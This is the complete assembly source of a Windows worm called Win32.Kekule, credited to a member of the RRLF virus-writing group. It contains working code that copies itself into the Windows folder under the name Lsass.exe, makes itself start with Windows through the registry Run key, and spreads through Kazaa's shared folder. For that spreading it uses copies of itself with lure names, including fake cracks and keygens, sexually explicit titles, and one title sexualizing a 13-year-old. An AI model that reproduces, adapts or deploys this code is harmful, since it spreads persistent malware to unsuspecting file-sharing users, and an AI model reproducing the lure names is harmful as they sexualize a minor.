; +----------------------------------------------------------------------------------------+
; |     Win32.Kekule
; |     by Hutley  / RRLF
; |     www.Hutley.de.vu
; |     hutleyvx@gmail.com
; |
; |     *** THANKS TO:
; |                - DiA  (the help and sources)
; |                - SPTH (you have patience with me!)
; |                - dr3f (any codes and personal help)
; |                - The others members of RRLF
; |
; |     *** FEATURES:
; |                - Infect the Kazaa creating a folder with infected files
; |                - Copy itself to Windows Folder
; |                - Start with windows
; |
; |     *** COMMENTS:
; |                I need more time. This virus has not news. Is
; |                 only old fuctions. But it's my first virus in asm, and
; |                 i'm still testing the api's and operators, functions.

include '%fasminc%\win32ax.inc'

.data
	VirFile 	rb 256d
	WinDir		rb 256d
	file1		db "\Lsass.exe"

	reg_handle	db ?
	reg_name	equ "Kekule"
	reg_subkey	equ "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
	reg_size	equ $-WinDir

	kazaa_subkey	equ "Software\Kazaa\LocalContent",0
	kazaa_handle	db ?
	kazaa_regname	equ "Dir0",0
	kazaa_pathname	equ "\Kekule",0
	kazaa_path	db 256d dup(?)
	kazaa_regsize	equ $-kazaa_path
	kazaa_begin	equ "012345:"

	temp		db 256d dup(?)

	o_string	db 256d dup(?)
	string1 	db "\porn_incest_in_prussia.jpg.exe",0
	string2 	db "\sex_hot_lesbian_very fucking.jpg.exe",0
	string3 	db "\fuck_fuck_fuck_fuck_fuck.exe",0
	string4 	db "\girl_13yo_movie redirect.exe",0
	string5 	db "\dog_with_sweet_girl_in_porn.exe",0
	string6 	db "\crack_WinXP_all_versions_working!.exe",0
	string7 	db "\Delphi_2006_Patch_FullWorks.exe",0
	string8 	db "\Visual_Strudio_2006_URL_database.exe",0
	string9 	db "\Delphi_8_keygen.exe",0
	string10	db "\Kekule_fucking_girls.jpg.exe",0

	copyright	equ "Win32.Kekule by Hutley/RRLF"

.code
start:
	call infect_windir			; Creates ONE Virus copy in Windows Folder
	call start_with_win			; Set to start by Registry
	call kazaa				; Spread by Kazaa
	call files_files			; Let´s copy any files!
	invoke ExitProcess, 0			  ; THATS ALL FOLKS!
.end start

proc infect_windir
	invoke GetModuleFileName, 0, VirFile, 256d
	invoke GetWindowsDirectory, WinDir, 256d
	invoke lstrcat, WinDir, file1
	invoke CopyFile, VirFile, WinDir, FALSE
	ret
endp

proc start_with_win
	invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, reg_subkey, 0, KEY_SET_VALUE, reg_handle
	invoke RegSetValueEx, dword[reg_handle], reg_name, 0, REG_SZ, WinDir, reg_size
	invoke RegCloseKey, dword[reg_handle]
	ret
endp

proc kazaa
	invoke GetWindowsDirectory, WinDir, 256d

	invoke lstrcat, WinDir, kazaa_pathname
	invoke lstrcpy, kazaa_path, WinDir

	invoke lstrcpy, temp, kazaa_begin
	invoke lstrcat, temp, kazaa_path

	invoke RegOpenKeyEx, HKEY_CURRENT_USER, kazaa_subkey, 0, KEY_SET_VALUE, kazaa_handle
	invoke RegSetValueEx, dword[kazaa_handle], kazaa_regname, 0, REG_SZ, temp, kazaa_regsize
	invoke RegCloseKey, dword[kazaa_handle]
	ret
endp

proc files_files
	invoke GetModuleFileName, 0, VirFile, 256d
	invoke GetWindowsDirectory, WinDir, 256d

	invoke lstrcpy, temp, WinDir
	invoke lstrcat, temp, kazaa_pathname

	invoke CreateDirectory, temp, 0

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string1
	invoke CopyFile, VirFile, o_string, FALSE

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string2
	invoke CopyFile, VirFile, o_string, FALSE

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string3
	invoke CopyFile, VirFile, o_string, FALSE

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string4
	invoke CopyFile, VirFile, o_string, FALSE

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string5
	invoke CopyFile, VirFile, o_string, FALSE

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string6
	invoke CopyFile, VirFile, o_string, FALSE

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string7
	invoke CopyFile, VirFile, o_string, FALSE

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string8
	invoke CopyFile, VirFile, o_string, FALSE

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string9
	invoke CopyFile, VirFile, o_string, FALSE

	invoke lstrcpy, o_string, temp
	invoke lstrcat, o_string, string10
	invoke CopyFile, VirFile, o_string, FALSE
	ret
endp
